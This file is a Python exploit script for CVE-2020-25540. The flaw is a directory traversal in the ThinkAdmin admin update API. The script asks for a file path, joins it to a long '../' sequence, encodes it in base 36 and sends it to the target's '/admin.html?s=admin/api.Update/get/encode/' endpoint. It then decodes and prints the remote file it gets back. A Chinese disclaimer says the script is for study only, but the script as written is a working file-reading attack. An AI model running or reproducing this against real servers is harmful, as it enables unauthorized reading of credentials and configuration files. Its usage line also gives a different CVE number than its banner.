#!/bin/python3
# coding:utf-8
import requests, base64, sys
import pyfiglet
import random
import urllib3

urllib3.disable_warnings()
print('''
免责声明：
    脚本仅供学习参考，请勿恶意攻击他人网站，
    如违法乱纪，造成一切后果由使用者自行承担
    技术无罪，与作者无关

    使用脚本默认同意以上说明！

                        --Author:lowkey0808
                        github: https://github.com/lowkey0808
''')
logger = pyfiglet.figlet_format("cve-2020-25540", font=random.choice(pyfiglet.FigletFont.getFonts()),
                                width=100)


def baseN(num, b):
    return ((num == 0) and "0") or \
           (baseN(num // b, b).lstrip("0") + "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])


def poc(url):
    while 1:
        s = input("读取的文件路径：").encode('utf-8')
        s1 = "/app/admin/../../../../../../../../../../../../../../..".encode('utf-8') + s

        if str(s) == "b'exit'":
            sys.exit(0)

        try:
            poc = ""
            for i in s1:
                poc += baseN(i, 36)
            header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"}
            u1 = url + "/admin.html?s=admin/api.Update/get/encode/" + poc
            text = requests.get(u1, headers=header, timeout=5)
            base_encode = text.json()["data"]["content"]
            print(base64.b64decode(base_encode).decode())
        except:
            sys.exit("[-]漏洞不存在")


if __name__ == "__main__":
    print(logger)
    if len(sys.argv) == 2:
        poc(sys.argv[1])
    else:
        print("Usage： python3 cve-2020-22540.py url\r\n"
              "        python3 cve-2020-22540 http://192.168.1.175:8000")
